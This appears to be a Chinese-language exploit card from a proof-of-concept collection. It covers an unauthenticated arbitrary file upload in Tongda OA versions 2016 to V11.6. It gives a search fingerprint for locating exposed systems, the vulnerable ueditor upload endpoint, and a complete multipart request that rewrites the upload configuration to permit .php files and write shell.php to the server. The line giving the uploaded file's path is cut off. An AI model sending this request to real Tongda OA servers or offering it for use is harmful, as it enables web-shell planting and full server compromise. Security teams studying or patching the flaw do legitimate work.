# 通达OAaction存在前台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 605`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="CONFIG[fileFieldName]"
filename
--00content0boundary00
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
10000
--00content0boundary00
Content-Disposition: form-data; name="CONFIG[filePathFormat]"
shell
--00content0boundary00
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
.php
--00content0boundary00
Content-Disposition: form-data; name="mufile"
submit
--00content0boundary00
Content-Disposition: form-data; name="filename"; filename="shell.php"
<?php echo 123;?>
--00content0boundary00--

上传文件地址为<http://ip/shel…（脚本共 642 字，完整版见原文）
```

**其他**
- 通达OA action存在前台任意文件上传漏洞: * 一、漏洞简介
* 二影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA 2016 - 通达OA V11.6